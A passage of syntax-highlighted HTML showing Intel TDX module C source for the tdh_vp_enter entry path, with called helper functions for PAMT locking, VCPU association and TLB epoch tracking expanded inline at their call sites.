class=\"type\">tdx_module_local_t</span>* <span class=\"title function_\">calculate_local_data</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                        <span class=\"type\">void</span>* local_data_addr;</span><br><span class=\"line\">                        _ASM_VOLATILE_ (<span class=\"string\">&quot;rdgsbase %0&quot;</span></span><br><span class=\"line\">                                        :<span class=\"string\">&quot;=r&quot;</span>(local_data_addr)</span><br><span class=\"line\">                                        :</span><br><span class=\"line\">                                        :<span class=\"string\">&quot;cc&quot;</span>);</span><br><span class=\"line\">                    </span><br><span class=\"line\">                        <span class=\"keyword\">return</span> (<span class=\"type\">tdx_module_local_t</span>*)local_data_addr;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">            IF_RARE (!local_data-&gt;local_data_fast_ref_ptr)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                local_data-&gt;local_data_fast_ref_ptr  = local_data;</span><br><span class=\"line\">                local_data-&gt;sysinfo_fast_ref_ptr     = calculate_sysinfo_table();</span><br><span class=\"line\">                local_data-&gt;global_data_fast_ref_ptr = calculate_global_data((<span class=\"type\">sysinfo_table_t</span>*)</span><br><span class=\"line\">                                                            local_data-&gt;sysinfo_fast_ref_ptr);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"keyword\">return</span> local_data;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">        leaf_opcode.raw = local_data-&gt;vmm_regs.rax;</span><br><span class=\"line\">                    <span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">gprs_state_u</span></span></span><br><span class=\"line\"><span class=\"class\">                    &#123;</span></span><br><span class=\"line\">                        <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">                        &#123;</span></span><br><span class=\"line\">                            <span class=\"type\">uint64_t</span> rax;</span><br><span class=\"line\">                            <span class=\"type\">uint64_t</span> rcx;</span><br><span class=\"line\">                            <span class=\"type\">uint64_t</span> rdx;</span><br><span class=\"line\">                            <span class=\"type\">uint64_t</span> rbx;</span><br><span class=\"line\">                            <span class=\"type\">uint64_t</span> rsp;</span><br><span class=\"line\">                            <span class=\"type\">uint64_t</span> rbp;</span><br><span class=\"line\">                            <span class=\"type\">uint64_t</span> rsi;</span><br><span class=\"line\">                            <span class=\"type\">uint64_t</span> rdi;</span><br><span class=\"line\">                            <span class=\"type\">uint64_t</span> r8;</span><br><span class=\"line\">                            <span class=\"type\">uint64_t</span> r9;</span><br><span class=\"line\">                            <span class=\"type\">uint64_t</span> r10;</span><br><span class=\"line\">                            <span class=\"type\">uint64_t</span> r11;</span><br><span class=\"line\">                            <span class=\"type\">uint64_t</span> r12;</span><br><span class=\"line\">                            <span class=\"type\">uint64_t</span> r13;</span><br><span class=\"line\">                            <span class=\"type\">uint64_t</span> r14;</span><br><span class=\"line\">                            <span class=\"type\">uint64_t</span> r15;</span><br><span class=\"line\">                        &#125;;</span><br><span class=\"line\">                    </span><br><span class=\"line\">                        <span class=\"type\">uint64_t</span> gprs[<span class=\"number\">16</span>];</span><br><span class=\"line\">                    &#125; <span class=\"type\">gprs_state_t</span>;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">api_error_type <span class=\"title function_\">tdh_vp_enter</span><span class=\"params\">(<span class=\"type\">uint64_t</span> vcpu_handle_and_flags)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">// Local data for return values and global data</span></span><br><span class=\"line\">    <span class=\"type\">tdx_module_local_t</span>  * local_data_ptr = get_local_data();</span><br><span class=\"line\">    <span class=\"type\">tdx_module_global_t</span> * global_data_ptr = get_global_data();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// TDVPR related variables</span></span><br><span class=\"line\">    <span class=\"type\">pa_t</span>                  tdvpr_pa;                    <span class=\"comment\">// TDVPR physical address</span></span><br><span class=\"line\">    <span class=\"type\">tdvps_t</span>             * tdvps_ptr = <span class=\"literal\">NULL</span>;            <span class=\"comment\">// Pointer to the TDVPS (multi-page linear address)</span></span><br><span class=\"line\">    <span class=\"type\">pamt_block_t</span>          tdvpr_pamt_block;            <span class=\"comment\">// TDVPR PAMT block</span></span><br><span class=\"line\">    <span class=\"type\">pamt_entry_t</span>        * tdvpr_pamt_entry_ptr;        <span class=\"comment\">// Pointer to the TDVPR PAMT entry</span></span><br><span class=\"line\">    <span class=\"type\">bool_t</span>                tdvpr_locked_flag = <span class=\"literal\">false</span>;   <span class=\"comment\">// Indicate TDVPR is locked</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// TDR related variables</span></span><br><span class=\"line\">    <span class=\"type\">pa_t</span>                  tdr_pa;                      <span class=\"comment\">// TDR physical address</span></span><br><span class=\"line\">    <span class=\"type\">tdr_t</span>               * tdr_ptr;                     <span class=\"comment\">// Pointer to the TDR page (linear address)</span></span><br><span class=\"line\">    <span class=\"type\">pamt_entry_t</span>        * tdr_pamt_entry_ptr;          <span class=\"comment\">// Pointer to the TDR PAMT entry</span></span><br><span class=\"line\">    <span class=\"type\">bool_t</span>                tdr_locked_flag = <span class=\"literal\">false</span>;     <span class=\"comment\">// Indicate TDVPR is locked</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">tdcs_t</span>              * tdcs_ptr = <span class=\"literal\">NULL</span>;             <span class=\"comment\">// Pointer to the TDCS page (linear address)</span></span><br><span class=\"line\">    <span class=\"type\">bool_t</span>                op_state_locked_flag = <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">uint16_t</span>              td_hkid;</span><br><span class=\"line\">    <span class=\"type\">tdvmcall_control_t</span>    control;</span><br><span class=\"line\">    <span class=\"type\">bool_t</span>                td_vmcs_loaded = <span class=\"literal\">false</span>;      <span class=\"comment\">// Indicates whether TD VMCS was loaded</span></span><br><span class=\"line\">    <span class=\"type\">vcpu_and_flags_t</span>      vcpu_and_flags = &#123; .raw = vcpu_handle_and_flags &#125;;</span><br><span class=\"line\">    <span class=\"type\">bool_t</span>                is_sept_locked = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    api_error_type        return_val = UNINITIALIZE_ERROR;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">ia32_misc_enable_t</span> misc_enable = &#123; .raw = ia32_rdmsr(IA32_MISC_ENABLES_MSR_ADDR) &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Boot NT4 bit should not be set</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (misc_enable.boot_nt4)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return_val = TDX_LIMIT_CPUID_MAXVAL_SET;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> EXIT_FAILURE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (vcpu_and_flags.reserved_0 || vcpu_and_flags.reserved_1)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return_val = api_error_with_operand_id(TDX_OPERAND_INVALID, OPERAND_ID_RCX);</span><br><span class=\"line\">        TDX_ERROR(<span class=\"string\">&quot;Input VCPU handle and flags has reserved bits sets - 0x%llx\\n&quot;</span>, vcpu_and_flags.raw);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> EXIT_FAILURE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    tdvpr_pa.raw = <span class=\"number\">0</span>;</span><br><span class=\"line\">    tdvpr_pa.page_4k_num = vcpu_and_flags.tdvpra_hpa_51_12;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Check and lock the TDVPR page</span></span><br><span class=\"line\">    return_val = check_and_lock_explicit_4k_private_hpa(tdvpr_pa,</span><br><span class=\"line\">                                                         OPERAND_ID_RCX,</span><br><span class=\"line\">                                                         TDX_LOCK_SHARED,</span><br><span class=\"line\">                                                         PT_TDVPR,</span><br><span class=\"line\">                                                         &amp;tdvpr_pamt_block,</span><br><span class=\"line\">                                                         &amp;tdvpr_pamt_entry_ptr,</span><br><span class=\"line\">                                                         &amp;tdvpr_locked_flag);</span><br><span class=\"line\"></span><br><span class=\"line\">    IF_RARE (return_val != TDX_SUCCESS)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        TDX_ERROR(<span class=\"string\">&quot;Failed to check/lock a TDVPR (0x%llx) - error = %llx\\n&quot;</span>, tdvpr_pa.raw, return_val);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> EXIT_FAILURE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Get and lock the owner TDR page</span></span><br><span class=\"line\">    <span class=\"comment\">// TDR is mapped in static keyhole range, and thus doesn&#x27;t need to be freed</span></span><br><span class=\"line\">    tdr_pa = get_pamt_entry_owner(tdvpr_pamt_entry_ptr);</span><br><span class=\"line\">    return_val = lock_and_map_implicit_tdr(tdr_pa,</span><br><span class=\"line\">                                           OPERAND_ID_TDR,</span><br><span class=\"line\">                                           TDX_RANGE_RW,</span><br><span class=\"line\">                                           TDX_LOCK_SHARED,</span><br><span class=\"line\">                                           &amp;tdr_pamt_entry_ptr,</span><br><span class=\"line\">                                           &amp;tdr_locked_flag,</span><br><span class=\"line\">                                           &amp;tdr_ptr);</span><br><span class=\"line\">                              api_error_type <span class=\"title function_\">lock_and_map_implicit_tdr</span><span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">                                    <span class=\"type\">pa_t</span> tdr_pa,</span></span><br><span class=\"line\"><span class=\"params\">                                    <span class=\"type\">uint64_t</span> operand_id,</span></span><br><span class=\"line\"><span class=\"params\">                                    <span class=\"type\">mapping_type_t</span> mapping_type,</span></span><br><span class=\"line\"><span class=\"params\">                                    <span class=\"type\">lock_type_t</span> lock_type,</span></span><br><span class=\"line\"><span class=\"params\">                                    <span class=\"type\">pamt_entry_t</span>** pamt_entry,</span></span><br><span class=\"line\"><span class=\"params\">                                    <span class=\"type\">bool_t</span>* is_locked,</span></span><br><span class=\"line\"><span class=\"params\">                                    <span class=\"type\">tdr_t</span>** tdr_p</span></span><br><span class=\"line\"><span class=\"params\">                                    )</span></span><br><span class=\"line\">                            &#123;</span><br><span class=\"line\">                                api_error_code_e errc = pamt_implicit_get_and_lock(tdr_pa, PT_4KB, lock_type, pamt_entry);</span><br><span class=\"line\">                                            api_error_code_e <span class=\"title function_\">pamt_implicit_get_and_lock</span><span class=\"params\">(<span class=\"type\">pa_t</span> pa, <span class=\"type\">page_size_t</span> leaf_size, <span class=\"type\">lock_type_t</span> leaf_lock_type,</span></span><br><span class=\"line\"><span class=\"params\">                                                            <span class=\"type\">pamt_entry_t</span>** pamt_entry)</span></span><br><span class=\"line\">                                            &#123;</span><br><span class=\"line\">                                                api_error_code_e errc;</span><br><span class=\"line\">                                                <span class=\"type\">pamt_entry_t</span>* tmp_pamt_entry = pamt_implicit_get(pa, leaf_size);</span><br><span class=\"line\">                                            </span><br><span class=\"line\">                                                <span class=\"keyword\">if</span> ((errc = acquire_sharex_lock_hp(&amp;tmp_pamt_entry-&gt;entry_lock, leaf_lock_type, <span class=\"literal\">false</span>)) != TDX_SUCCESS)</span><br><span class=\"line\">                                                &#123;</span><br><span class=\"line\">                                                    free_la(tmp_pamt_entry);</span><br><span class=\"line\">                                                    *pamt_entry = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">                                                    <span class=\"keyword\">return</span> errc;</span><br><span class=\"line\">                                                &#125;</span><br><span class=\"line\">                                            </span><br><span class=\"line\">                                                *pamt_entry = tmp_pamt_entry;</span><br><span class=\"line\">                                                <span class=\"keyword\">return</span> TDX_SUCCESS;</span><br><span class=\"line\">                                            &#125;</span><br><span class=\"line\">                                <span class=\"keyword\">if</span> (errc != TDX_SUCCESS)</span><br><span class=\"line\">                                &#123;</span><br><span class=\"line\">                                    TDX_ERROR(<span class=\"string\">&quot;get_implicit_page_pamt_and_lock error\\n&quot;</span>);</span><br><span class=\"line\">                                    <span class=\"keyword\">return</span> api_error_with_operand_id(errc, operand_id);</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                            </span><br><span class=\"line\">                                *is_locked = <span class=\"literal\">true</span>;</span><br><span class=\"line\">                            </span><br><span class=\"line\">                                <span class=\"type\">uint16_t</span> hkid = get_global_data()-&gt;hkid;</span><br><span class=\"line\">                                tdr_pa = set_hkid_to_pa(tdr_pa, hkid);</span><br><span class=\"line\">                            </span><br><span class=\"line\">                                <span class=\"type\">uint64_t</span> tdr_addr = tdr_pa.full_pa;</span><br><span class=\"line\">                            </span><br><span class=\"line\">                                *tdr_p = map_continuous_pages(&amp;tdr_addr, <span class=\"number\">1</span>, mapping_type, STATIC_KEYHOLE_IDX_TDR);</span><br><span class=\"line\">                            </span><br><span class=\"line\">                                <span class=\"keyword\">return</span> TDX_SUCCESS;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    IF_RARE (return_val != TDX_SUCCESS)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        TDX_ERROR(<span class=\"string\">&quot;Failed to lock/map a TDR - error = %lld\\n&quot;</span>, return_val);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> EXIT_FAILURE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Map the TDCS structure and check the state</span></span><br><span class=\"line\">    return_val = check_state_map_tdcs_and_lock(tdr_ptr, TDX_RANGE_RW, TDX_LOCK_SHARED,</span><br><span class=\"line\">                                               <span class=\"literal\">false</span>, TDH_VP_ENTER_LEAF, &amp;tdcs_ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (return_val != TDX_SUCCESS)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        TDX_ERROR(<span class=\"string\">&quot;State check or TDCS lock failure - error = %llx\\n&quot;</span>, return_val);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> EXIT_FAILURE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    op_state_locked_flag = <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Get the TD&#x27;s ephemeral HKID</span></span><br><span class=\"line\">    td_hkid = tdr_ptr-&gt;key_management_fields.hkid;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Map the TDVPS structure</span></span><br><span class=\"line\">    <span class=\"comment\">// TDVPS is mapped in static keyhole range, and thus doesn&#x27;t need to be freed</span></span><br><span class=\"line\">    tdvps_ptr = map_tdvps(tdvpr_pa, td_hkid, tdcs_ptr-&gt;management_fields.num_l2_vms, TDX_RANGE_RW);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tdvps_ptr == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        TDX_ERROR(<span class=\"string\">&quot;TDVPS mapping failed\\n&quot;</span>);</span><br><span class=\"line\">        return_val = TDX_TDCX_NUM_INCORRECT;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> EXIT_FAILURE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Associate the VCPU</span></span><br><span class=\"line\">    <span class=\"type\">bool_t</span> new_associate_flag = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    return_val = check_and_associate_vcpu(tdvps_ptr, tdcs_ptr, &amp;new_associate_flag, <span class=\"literal\">false</span>);</span><br><span class=\"line\">                api_error_code_e <span class=\"title function_\">check_and_associate_vcpu</span><span class=\"params\">(<span class=\"type\">tdvps_t</span> * tdvps_ptr,</span></span><br><span class=\"line\"><span class=\"params\">                                              <span class=\"type\">tdcs_t</span> * tdcs_ptr,</span></span><br><span class=\"line\"><span class=\"params\">                                              <span class=\"type\">bool_t</span>* new_association,</span></span><br><span class=\"line\"><span class=\"params\">                                                          <span class=\"type\">bool_t</span> allow_disabled)</span></span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    <span class=\"type\">uint8_t</span> curr_vcpu_state = tdvps_ptr-&gt;management.state;</span><br><span class=\"line\">                </span><br><span class=\"line\">                    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">                     *  Check the VCPU state to make sure it has been initialized and is not</span></span><br><span class=\"line\"><span class=\"comment\">                     *  being torn down.  This may race with state changes if the VCPU is</span></span><br><span class=\"line\"><span class=\"comment\">                     *  associated with another LP.  In this case the subsequent association</span></span><br><span class=\"line\"><span class=\"comment\">                     *  below will fail</span></span><br><span class=\"line\"><span class=\"comment\">                     */</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (!((curr_vcpu_state == VCPU_READY) ||</span><br><span class=\"line\">                          ((curr_vcpu_state == VCPU_DISABLED) &amp;&amp; allow_disabled)))</span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> TDX_VCPU_STATE_INCORRECT;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                </span><br><span class=\"line\">                    <span class=\"keyword\">return</span> associate_vcpu(tdvps_ptr, tdcs_ptr, new_association);</span><br><span class=\"line\">                                                    api_error_code_e <span class=\"title function_\">associate_vcpu</span><span class=\"params\">(<span class=\"type\">tdvps_t</span> * tdvps_ptr,</span></span><br><span class=\"line\"><span class=\"params\">                                                                <span class=\"type\">tdcs_t</span> * tdcs_ptr,</span></span><br><span class=\"line\"><span class=\"params\">                                                                <span class=\"type\">bool_t</span>* new_association)</span></span><br><span class=\"line\">                                &#123;</span><br><span class=\"line\">                                            <span class=\"type\">uint32_t</span>         prev_assoc_lpid;  <span class=\"comment\">// Previous associated LPID</span></span><br><span class=\"line\">                                            <span class=\"type\">uint32_t</span>         curr_lp_id = get_local_data()-&gt;lp_info.lp_id;</span><br><span class=\"line\">                                        </span><br><span class=\"line\">                                            <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">                                             *  Atomically check that this VCPU is not associated with any LP, and</span></span><br><span class=\"line\"><span class=\"comment\">                                             *  associate it with the current LP.  The VCPU may already be associated</span></span><br><span class=\"line\"><span class=\"comment\">                                             *  with the current LP, but if it&#x27;s associated with another LP this is</span></span><br><span class=\"line\"><span class=\"comment\">                                             *  an error.</span></span><br><span class=\"line\"><span class=\"comment\">                                             */</span></span><br><span class=\"line\">                                            prev_assoc_lpid = _lock_cmpxchg_32b(VCPU_NO_LP, <span class=\"comment\">// Expected value: no lp</span></span><br><span class=\"line\">                                                                                curr_lp_id,  <span class=\"comment\">// New Value</span></span><br><span class=\"line\">                                                                                &amp;tdvps_ptr-&gt;management.assoc_lpid); <span class=\"comment\">// Target</span></span><br><span class=\"line\">                                            <span class=\"keyword\">if</span> ((prev_assoc_lpid != VCPU_NO_LP) &amp;&amp; (prev_assoc_lpid != curr_lp_id))</span><br><span class=\"line\">                                            &#123;</span><br><span class=\"line\">                                                <span class=\"keyword\">return</span> TDX_VCPU_ASSOCIATED;</span><br><span class=\"line\">                                            &#125;</span><br><span class=\"line\">                                        </span><br><span class=\"line\">                                            <span class=\"comment\">// Association succeeded.  VCPU state must be VCPU_READY_*</span></span><br><span class=\"line\">                                        </span><br><span class=\"line\">                                            <span class=\"comment\">// Set ACTIVE_VMCS to -1 to indicate the need for VMPTRLD</span></span><br><span class=\"line\">                                            get_local_data()-&gt;vp_ctx.active_vmcs = ACTIVE_VMCS_NONE;</span><br><span class=\"line\">                                        </span><br><span class=\"line\">                                            <span class=\"type\">uint64_t</span> seamdb_index = get_global_data()-&gt;seamdb_index;</span><br><span class=\"line\">                                            <span class=\"keyword\">if</span> (tdvps_ptr-&gt;management.last_seamdb_index != seamdb_index)</span><br><span class=\"line\">                                            &#123;</span><br><span class=\"line\">                                                <span class=\"comment\">// The TDX module has been updated since the last time this VCPU was associated.</span></span><br><span class=\"line\">                                                <span class=\"comment\">// The VCPU remains associated with the current LP.</span></span><br><span class=\"line\">                                                clear_module_host_state_flags(tdvps_ptr);</span><br><span class=\"line\">                                                clear_lp_host_state_flags(tdvps_ptr);</span><br><span class=\"line\">                                                tdvps_ptr-&gt;management.last_seamdb_index = seamdb_index;</span><br><span class=\"line\">                                            &#125;</span><br><span class=\"line\">                                        </span><br><span class=\"line\">                                            <span class=\"comment\">// If this is a new association, update TD VMCS</span></span><br><span class=\"line\">                                            <span class=\"keyword\">if</span> (prev_assoc_lpid == VCPU_NO_LP)</span><br><span class=\"line\">                                            &#123;</span><br><span class=\"line\">                                                <span class=\"comment\">// The current VCPU is associated with a new LP</span></span><br><span class=\"line\">                                        </span><br><span class=\"line\">                                                clear_lp_host_state_flags(tdvps_ptr);</span><br><span class=\"line\">                                        </span><br><span class=\"line\">                                                <span class=\"comment\">// Atomically increment the number of associated VCPUs</span></span><br><span class=\"line\">                                                (<span class=\"type\">void</span>)_lock_xadd_32b(&amp;(tdcs_ptr-&gt;management_fields.num_assoc_vcpus), <span class=\"number\">1</span>);</span><br><span class=\"line\">                                        </span><br><span class=\"line\">                                                *new_association = <span class=\"literal\">true</span>;</span><br><span class=\"line\">                                            &#125;</span><br><span class=\"line\">                                            <span class=\"keyword\">else</span></span><br><span class=\"line\">                                            &#123;</span><br><span class=\"line\">                                                *new_association = <span class=\"literal\">false</span>;</span><br><span class=\"line\">                                            &#125;</span><br><span class=\"line\">                                        </span><br><span class=\"line\">                                            <span class=\"keyword\">return</span> TDX_SUCCESS;</span><br><span class=\"line\">                                        &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    IF_RARE (return_val != TDX_SUCCESS)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        TDX_ERROR(<span class=\"string\">&quot;Failed to associate VCPU - error = %llx\\n&quot;</span>, return_val);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> EXIT_FAILURE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    set_vm_vmcs_as_active(tdvps_ptr, tdvps_ptr-&gt;management.curr_vm);</span><br><span class=\"line\">    td_vmcs_loaded = <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((vcpu_and_flags.host_recoverability_hint) &amp;&amp; (tdvps_ptr-&gt;management.last_td_exit != LAST_EXIT_ASYNC_TRAP))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return_val = api_error_with_operand_id(TDX_OPERAND_INVALID, OPERAND_ID_RCX);</span><br><span class=\"line\">        TDX_ERROR(<span class=\"string\">&quot;Host recoverability is set, but last exit wasn&#x27;t ASYNC_TRAP - %d\\n&quot;</span>, tdvps_ptr-&gt;management.last_td_exit);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> EXIT_FAILURE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (vcpu_and_flags.resume_l1)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Resume to L1 is only supported on exit from L2</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (tdvps_ptr-&gt;management.curr_vm == <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            return_val = api_error_with_operand_id(TDX_OPERAND_INVALID, OPERAND_ID_RCX);</span><br><span class=\"line\">            TDX_ERROR(<span class=\"string\">&quot;Resume to L1 is only supported on exit from L2\\n&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">goto</span> EXIT_FAILURE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// RESUME_L1 is sticky; the internal flag is cleared later, only if actual L1 entry happens</span></span><br><span class=\"line\">        set_l2_exit_host_routing(tdvps_ptr);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// We read TSC below.  Compare IA32_TSC_ADJUST to the value sampled on TDHSYSINIT</span></span><br><span class=\"line\">    <span class=\"comment\">// to make sure the host VMM doesn&#x27;t play any trick on us.</span></span><br><span class=\"line\">    IF_RARE (ia32_rdmsr(IA32_TSC_ADJ_MSR_ADDR) != global_data_ptr-&gt;plt_common_config.ia32_tsc_adjust)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return_val = api_error_with_operand_id(TDX_INCONSISTENT_MSR, IA32_TSC_ADJ_MSR_ADDR);</span><br><span class=\"line\">        TDX_ERROR(<span class=\"string\">&quot;Inconsistent IA32_TSC_ADJUST MSR!\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> EXIT_FAILURE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Read TSC and verify that it is higher than LAST_EXIT_TSC.</span></span><br><span class=\"line\">    <span class=\"comment\">// Do the calculation as signed 64b, works even if TSC rolls over.</span></span><br><span class=\"line\">    IF_RARE (((<span class=\"type\">int64_t</span>)(ia32_rdtsc() - tdvps_ptr-&gt;management.last_exit_tsc)) &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return_val = TDX_TSC_ROLLBACK;</span><br><span class=\"line\">        TDX_ERROR(<span class=\"string\">&quot;TSC is lower than LAST_EXIT_TSC!\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> EXIT_FAILURE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// If MONITOR/MWAIT support is enabled, then MONITOR_FSM must be enabled</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tdcs_ptr-&gt;executions_ctl_fields.cpuid_flags.monitor_mwait_supported &amp;&amp;</span><br><span class=\"line\">        !misc_enable.enable_monitor_fsm)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return_val = api_error_with_operand_id(TDX_INCORRECT_MSR_VALUE, IA32_MISC_ENABLES_MSR_ADDR);</span><br><span class=\"line\">        TDX_ERROR(<span class=\"string\">&quot;If MONITOR/MWAIT support is enabled, then MONITOR_FSM must be enabled\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> EXIT_FAILURE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Save the VMM value of IA32_DS_AREA</span></span><br><span class=\"line\">    local_data_ptr-&gt;vmm_non_extended_state.ia32_ds_area = ia32_rdmsr(IA32_DS_AREA_MSR_ADDR);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Update the TLB tracking state. This is done as a critical section,</span></span><br><span class=\"line\">    <span class=\"comment\">// allowing concurrent TDHVPENTERs, but no concurrent TDHMEMTRACK</span></span><br><span class=\"line\">    IF_RARE (!adjust_tlb_tracking_state(tdr_ptr, tdcs_ptr, tdvps_ptr, new_associate_flag))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">                        <span class=\"type\">bool_t</span> <span class=\"title function_\">adjust_tlb_tracking_state</span><span class=\"params\">(<span class=\"type\">tdr_t</span>* tdr_ptr, <span class=\"type\">tdcs_t</span>* tdcs_ptr, <span class=\"type\">tdvps_t</span>* tdvps_ptr,</span></span><br><span class=\"line\"><span class=\"params\">                                                     <span class=\"type\">bool_t</span> new_association)</span></span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                        <span class=\"type\">tdcs_epoch_tracking_fields_t</span>* epoch_tracking = &amp;tdcs_ptr-&gt;epoch_tracking;</span><br><span class=\"line\">                    </span><br><span class=\"line\">                        <span class=\"comment\">// Lock the TD epoch</span></span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (acquire_sharex_lock_sh(&amp;epoch_tracking-&gt;epoch_lock) != LOCK_RET_SUCCESS)</span><br><span class=\"line\">                        &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    </span><br><span class=\"line\">                        <span class=\"comment\">// Sample the TD epoch and atomically increment the REFCOUNT</span></span><br><span class=\"line\">                        <span class=\"type\">uint64_t</span> vcpu_epoch = epoch_tracking-&gt;epoch_and_refcount.td_epoch;</span><br><span class=\"line\">                        (<span class=\"type\">void</span>)_lock_xadd_16b(&amp;epoch_tracking-&gt;epoch_and_refcount.refcount[vcpu_epoch &amp; <span class=\"number\">1</span>], <span class=\"number\">1</span>);</span><br><span class=\"line\">                    </span><br><span class=\"line\">                        <span class=\"comment\">// End of critical section, release lock.</span></span><br><span class=\"line\">                        release_sharex_lock_sh(&amp;epoch_tracking-&gt;epoch_lock);</span><br><span class=\"line\">                    </span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (vcpu_epoch != tdvps_ptr-&gt;management.vcpu_epoch)</span><br><span class=\"line\">                        &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (!new_association)</span><br><span class=\"line\">                            &#123;</span><br><span class=\"line\">                                <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">                                 *  The current VCPU was already associated with the current LP at the</span></span><br><span class=\"line\"><span class=\"comment\">                                 *  beginning of TDHVPENTER.</span></span><br><span class=\"line\"><span class=\"comment\">                                 *  Flush the TLB context and extended paging structure (EPxE) caches</span></span><br><span class=\"line\"><span class=\"comment\">                                 *  associated with the current TD.</span></span><br><span class=\"line\"><span 